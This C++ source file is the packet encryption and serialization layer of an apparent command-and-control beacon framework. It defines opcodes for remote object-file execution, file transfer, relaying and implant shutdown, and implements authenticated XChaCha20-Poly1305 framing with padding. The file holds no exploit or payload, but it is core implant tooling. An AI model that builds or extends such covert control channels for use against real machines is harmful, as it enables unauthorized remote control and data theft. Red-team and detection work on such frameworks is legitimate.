// -- Packet crypto layer: encryption, serialization, opcode validation ------
// Extracted from net_abstract.cpp to reduce the monolith.
#include "../../include/network/net_abstract.h"
#include "../../include/network/net_internal.h"
#include "../../include/utils.h"
#include "../../libs/bastia/bastia.h"
#include <cstring>

namespace pandragon {

    // -- Little-endian decode helpers ----------------------------------------
    static inline uint32_t read_le32(const uint8_t* p) {
        return static_cast<uint32_t>(p[0])
             | static_cast<uint32_t>(p[1]) << 8
             | static_cast<uint32_t>(p[2]) << 16
             | static_cast<uint32_t>(p[3]) << 24;
    }


    // -- Opcode validation helpers --------------------------------------------
    static bool isValidS2BOpcode(uint8_t op) {
        switch (static_cast<s2b_opcode>(op)) {
            case s2b_opcode::NO_TASKS:
            case s2b_opcode::ECHO:
            case s2b_opcode::SLEEP:
            case s2b_opcode::DIE:
            case s2b_opcode::BOF_EXEC:
            case s2b_opcode::BOF_FREE:
            case s2b_opcode::LONG_RUNNING_BOF:
            // Key rotation opcode
            case s2b_opcode::ROTATE_KEY:
                return true;
            // Chunked file transfer opcodes
            case s2b_opcode::FILE_DOWNLOAD_START:
            case s2b_opcode::FILE_DOWNLOAD_CHUNK:
            case s2b_opcode::FILE_UPLOAD_START:
            case s2b_opcode::FILE_UPLOAD_CHUNK:
                return true;
            // Relay opcodes
            case s2b_opcode::START_RELAY:
            case s2b_opcode::STOP_RELAY:
            case s2b_opcode::RELAY_ADD_CHILD:
            case s2b_opcode::RELAY_REMOVE_CHILD:
            case s2b_opcode::RELAY_DOWN:
                return true;
            default:
                return false;
        }
    }

    static bool isValidB2SOpcode(uint8_t op) {
        switch (static_cast<b2s_opcode>(op)) {
            case b2s_opcode::BEACON_CHECK_IN:
            case b2s_opcode::BEACON_POLL:
            case b2s_opcode::BEACON_TASK_RESULT:
            case b2s_opcode::BEACON_ERROR:
            case b2s_opcode::BOF_OUTPUT:
            case b2s_opcode::LIST_FILES_RESULT:
            // Key rotation acknowledgment
            case b2s_opcode::KEY_ROTATE_ACK:
                return true;
            // Chunked file transfer opcodes
            case b2s_opcode::FILE_DOWNLOAD_ACK:
            case b2s_opcode::FILE_CHUNK_DATA:
            case b2s_opcode::FILE_UPLOAD_ACK:
                return true;
            // Relay opcodes
            case b2s_opcode::RELAY_CHILD_UP:
                return true;
            default:
                return false;
        }
    }


    // -- parsePacket -------------------------------------------------
    //
    //  @param buf         raw wire bytes (must stay alive as long as out is used)
    //  @param buf_len     total byte count in buf
    //  @param direction   true  = server->beacon (validate s2b opcodes)
    //                     false = beacon->server (validate b2s opcodes)
    //  @param out         filled on OK only
    //  @returns           parse_err::OK or a specific failure code
    //
    parse_err parsePacket(const uint8_t* buf,
                          size_t         buf_len,
                          bool           direction_s2b,
                          parsed_packet& out)
    {
        if (!buf)
            return parse_err::NULL_BUFFER;

        // 1. Size guard: reject anything shorter than a full header.
        if (buf_len < HEADER_LEN)
            return parse_err::BUFFER_TOO_SMALL;

        // 2. Decode fields explicitly from raw bytes (no struct cast).
        size_t offset = 0;

        out.magic = read_le32(buf + offset);            offset += 4;

        out.version = static_cast<version_t>(buf[offset]);  offset += 1;

        memcpy(out.beacon_id, buf + offset, 8);         offset += 8;

        out.opcode = buf[offset];                        offset += 1;

        out.seq_num = read_le32(buf + offset);           offset += 4;

        memcpy(out.nonce, buf + offset, 24);             offset += 24;

        out.payload_len = read_le32(buf + offset);       offset += 4;

        // offset == HEADER_LEN here (46 bytes)

        // 3. Magic check.
        if (out.magic != PANDRAGON_MAGIC)
            return parse_err::BAD_MAGIC;

        // 4. Version check: extend this when you bump version_t.
        if (out.version != version_t::epoch)
            return parse_err::BAD_VERSION;

        // 5. Opcode check: direction-aware.
        bool opcode_ok = direction_s2b
            ? isValidS2BOpcode(out.opcode)
            : isValidB2SOpcode(out.opcode);

        c_debugPrint(g_state.nt, "[parsePacket] opcode=0x%02x direction_s2b=%d opcode_ok=%d\n",
                       (unsigned)out.opcode, direction_s2b, opcode_ok);

        if (!opcode_ok)
            return parse_err::BAD_OPCODE;

        // 6. Payload bounds: payload_len (ciphertext + MAC) must fit in remaining buf.
        if (buf_len < HEADER_LEN) {
            c_debugPrint(g_state.nt, "[parsePacket] BUFFER_TOO_SMALL: %zu < %u\n",
                           buf_len, (unsigned)HEADER_LEN);
            return parse_err::BUFFER_TOO_SMALL;
        }

        c_debugPrint(g_state.nt, "[parsePacket] Checking: payload_len=%u vs buf_len-HEADER_LEN=%zu\n",
                       (unsigned)out.payload_len, buf_len - HEADER_LEN);
        if (out.payload_len > buf_len - HEADER_LEN) {
            c_debugPrint(g_state.nt, "[parsePacket] PAYLOAD_OVERFLOW: %u > %zu\n",
                           (unsigned)out.payload_len, buf_len - HEADER_LEN);
            return parse_err::PAYLOAD_OVERFLOW;
        }

        // 7. Payload pointer: point to ciphertext immediately after header
        out.payload_ptr = buf + HEADER_LEN;

        return parse_err::OK;
    }

    // -- encryptPayload ----------------------------------------
    // Encrypts payload and authenticates both payload and header (via AD)
    static std::pair<int, uint8_t*> encryptPayload(
        const uint8_t* plaintext,
        size_t plaintext_len,
        const uint8_t nonce[24],
        const uint8_t key[32],
        const uint8_t* header_data = nullptr,    // Header to authenticate (not encrypted)
        size_t header_len = 0)
    {
        if (!nonce || !key) {
            return std::make_pair(-1, nullptr);
        }
        // plaintext can be NULL if plaintext_len is 0 (empty payload)
        if (!plaintext && plaintext_len > 0) {
            return std::make_pair(-1, nullptr);
        }

        // Allocate buffer for encrypted data + MAC (16 bytes)
        size_t encrypted_size = plaintext_len + 16;
        uint8_t* encrypted_buffer = (uint8_t*)__malloc(encrypted_size);
        if (!encrypted_buffer) {
            return std::make_pair(-2, nullptr);
        }

        size_t actual_encrypted_size;
        int result = xchacha20poly1305_encrypt(
            encrypted_buffer,
            &actual_encrypted_size,
            plaintext,
            plaintext_len,
            header_data,    // Additional Data: header bytes for authentication
            header_len,
            nonce,
            key
        );

        if (result != 0) {
            __free(encrypted_buffer);
            return std::make_pair(result, nullptr);
        }

        return std::make_pair(0, encrypted_buffer);
    }

    // -- decryptPayload --------------------------------------------------------
    // Decrypts payload and authenticates both payload and header (via AD)
    static std::pair<int, uint8_t*> decryptPayload(
        const uint8_t* ciphertext,
        size_t ciphertext_len,  // includes 16-byte MAC
        const uint8_t nonce[24],
        const uint8_t key[32],
        const uint8_t* header_data = nullptr,    // Header to authenticate (not encrypted)
        size_t header_len = 0)
    {
        c_debugPrint(g_state.nt, "[decryptPayload] ENTER: ciphertext_len=%zu, g_state.nt=%p", ciphertext_len, (void*)g_state.nt);
        c_debugPrint(g_state.nt, "ciphertext_len=%zu nonce=%p key=%p\n",
                       ciphertext_len, (const void*)nonce, (const void*)key);

        if (!ciphertext || !nonce || !key || ciphertext_len < 16) {
            c_debugPrint(g_state.nt, "Invalid params: ciphertext=%p len=%zu\n",
                           (const void*)ciphertext, ciphertext_len);
            return std::make_pair(-1, nullptr);
        }

        size_t plaintext_size = ciphertext_len - 16;
        c_debugPrint(g_state.nt, "plaintext_size=%zu\n", plaintext_size);

        size_t alloc_size = plaintext_size > 0 ? plaintext_size : 1;
        uint8_t* plaintext_buffer = (uint8_t*)__malloc(alloc_size);
        
        if (!plaintext_buffer) {
            c_debugPrint(g_state.nt, "malloc failed\n");
            return std::make_pair(-2, nullptr);
        }

        size_t actual_plaintext_size;
        int result = xchacha20poly1305_decrypt(
            plaintext_buffer,
            &actual_plaintext_size,
            ciphertext,
            ciphertext_len,
            header_data,    // Additional Data: header bytes for authentication
            header_len,
            nonce,
            key
        );

        c_VERBOSE(g_state.nt, "xchacha20poly1305_decrypt returned %d, actual_size=%zu\n",
                       result, actual_plaintext_size);
        
        if (result != 0) {
            __free(plaintext_buffer);
            return std::make_pair(result, nullptr);
        }

        return std::make_pair(0, plaintext_buffer);
    }

    // -- serializePacket -----------------------------------------------
    // Packet format: [HEADER][ciphertext+MAC]
    // Header fields (INCLUDING payload_len) are authenticated via AD
    // Plaintext is padded using PKCS#7 to a multiple of 16 bytes.
    std::pair<parse_err, std::pair<uint8_t*, size_t>> serializePacket(
        const uint8_t beaconID[8],
        b2s_opcode opcode,
        uint32_t seq,
        const uint8_t nonce[24],
        const uint8_t* payload,
        size_t payload_len,
        const uint8_t* encryption_key,
        bool pad,
        uint16_t pad_max)
    {
        if (!beaconID || !nonce || !encryption_key) {
            return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
        }

        // Validate opcode
        if (!isValidB2SOpcode(static_cast<uint8_t>(opcode))) {
            return std::make_pair(parse_err::BAD_OPCODE, std::make_pair(nullptr, 0));
        }

        // 1. Calculate padded length (PKCS#7)
        size_t plaintext_len = payload_len;
        size_t padded_len = plaintext_len;
        
        if (pad) {
            if (plaintext_len > SIZE_MAX - 16) {
                return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
            }
            // Standard PKCS#7: always add 1-16 bytes to reach multiple of 16
            padded_len = (plaintext_len + 16) & ~15;
            
            // If user wants random padding up to pad_max, we can choose a random multiple of 16
            // that is >= standard padded_len and <= pad_max.
            if (pad_max > padded_len) {
                size_t max_blocks = pad_max / 16;
                size_t min_blocks = padded_len / 16;
                if (max_blocks > min_blocks) {
                    uint8_t randByte = 0;
                    generateSecureRandom(g_state.nt, &randByte, 1);
                    size_t extra_blocks = randByte % (max_blocks - min_blocks + 1);
                    padded_len += (extra_blocks * 16);
                }
            }
        } else {
            // Still pad to 16 for "professionalism" and block alignment if needed, 
            // but the user requested 'pad' flag controls this.
            // Actually, spec REQ-008 says: "If padding is enabled, the plaintext MUST be padded using PKCS#7"
            // If NOT enabled, we just use raw length.
            padded_len = plaintext_len;
        }

        // 2. Prepare plaintext with padding
        uint8_t* padded_plaintext = (uint8_t*)__malloc(padded_len > 0 ? padded_len : 1);
        if (!padded_plaintext) return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));

        if (payload && plaintext_len > 0) {
            __memcpy(padded_plaintext, payload, plaintext_len);
        }
        
        if (pad && padded_len > plaintext_len) {
            pkcs7Pad(padded_plaintext, plaintext_len, padded_len);
        }

        // 3. Compute encrypted payload length (padded plaintext + 16-byte MAC)
        size_t encrypted_payload_len = padded_len + 16;

        // 4. Build the header used for wire transmission and AAD
        uint8_t header_bytes[HEADER_LEN];
        size_t offset = 0;
        *(uint32_t*)(header_bytes + offset) = PANDRAGON_MAGIC; offset += 4;
        header_bytes[offset] = static_cast<uint8_t>(version_t::epoch); offset += 1;
        __memcpy(header_bytes + offset, beaconID, 8); offset += 8;
        header_bytes[offset] = static_cast<uint8_t>(opcode); offset += 1;
        *(uint32_t*)(header_bytes + offset) = seq; offset += 4;
        __memcpy(header_bytes + offset, nonce, 24); offset += 24;
        *(uint32_t*)(header_bytes + offset) = static_cast<uint32_t>(encrypted_payload_len); offset += 4;

        // 5. Encrypt payload WITH header as Additional Data (AAD)
        // REQ-005: payload_len is INCLUDED in AAD.
        auto encrypt_result = encryptPayload(padded_plaintext, padded_len, nonce, encryption_key,
                                              header_bytes, HEADER_LEN);
        __free(padded_plaintext);

        if (encrypt_result.first != 0) {
            return std::make_pair(parse_err::PAYLOAD_OVERFLOW, std::make_pair(nullptr, 0));
        }

        uint8_t* encrypted_payload = encrypt_result.second;

        // 6. Allocate buffer for the complete packet [HEADER][CIPHERTEXT+MAC]
        size_t total_packet_size = HEADER_LEN + encrypted_payload_len;
        uint8_t* packet_buffer = (uint8_t*)__malloc(total_packet_size);
        if (!packet_buffer) {
            __free(encrypted_payload);
            return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
        }

        // Copy header and encrypted payload
        __memcpy(packet_buffer, header_bytes, HEADER_LEN);
        __memcpy(packet_buffer + HEADER_LEN, encrypted_payload, encrypted_payload_len);

        __free(encrypted_payload);

        return std::make_pair(parse_err::OK, std::make_pair(packet_buffer, total_packet_size));
    }

    /* -- deserializePacket -------------------------------------
    / Decrypts payload and authenticates header fields and AAD
        Technically here we should check beacon ID, but 2 beacons sharing the same ID means they also share the same key [?],
        which is impossible in normal deployments.
    */
    std::pair<parse_err, parsed_packet> deserializePacket(
        const uint8_t* packet_buffer,
        size_t packet_len,
        const uint8_t* encryption_key,
        bool direction_s2b)
    {
        c_VERBOSE(g_state.nt, "packet_len=%zu key=%p dir=%d\n",
                       packet_len, (const void*)encryption_key, direction_s2b);

        if (!packet_buffer || !encryption_key) {
            return std::make_pair(parse_err::NULL_BUFFER, parsed_packet{});
        }

        // Parse the header first
        parsed_packet parsed = {};
        parsed.decrypted_payload = nullptr;
        parsed.decrypted_len = 0;

        parse_err parse_result = parsePacket(packet_buffer, packet_len, direction_s2b, parsed);
        if (parse_result != parse_err::OK) {
            return std::make_pair(parse_result, parsed);
        }

        // Build header for authentication - use header as-is (including payload_len)
        uint8_t header_for_auth[HEADER_LEN];
        __memcpy(header_for_auth, packet_buffer, HEADER_LEN);

        // Decrypt the payload WITH full header as Additional Data (AAD)
        auto decrypt_result = decryptPayload(parsed.payload_ptr, parsed.payload_len,
                                              parsed.nonce, encryption_key,
                                              header_for_auth, HEADER_LEN);

        if (decrypt_result.first != 0) {
            c_debugPrint(g_state.nt, "[deserializePacket] Header authentication failed!\n");
            return std::make_pair(parse_err::DECRYPTION_FAILED, parsed);
        }

        // Store decrypted payload and strip PKCS#7 padding if present
        uint8_t* plaintext = decrypt_result.second;
        size_t plaintext_len = parsed.payload_len - MAC_LEN;
        
        // Try unpadding
        size_t unpadded_len = pkcs7Unpad(plaintext, plaintext_len);
        if (unpadded_len != (size_t)-1) {
            parsed.decrypted_len = unpadded_len;
        } else {
            // No valid PKCS#7 padding found - use raw decrypted length
            parsed.decrypted_len = plaintext_len;
        }
        
        parsed.decrypted_payload = plaintext;

        c_VERBOSE(g_state.nt, "Success: decrypted_len=%zu (header authenticated)\n", parsed.decrypted_len);
        return std::make_pair(parse_err::OK, parsed);
    }

} // namespace pandragon
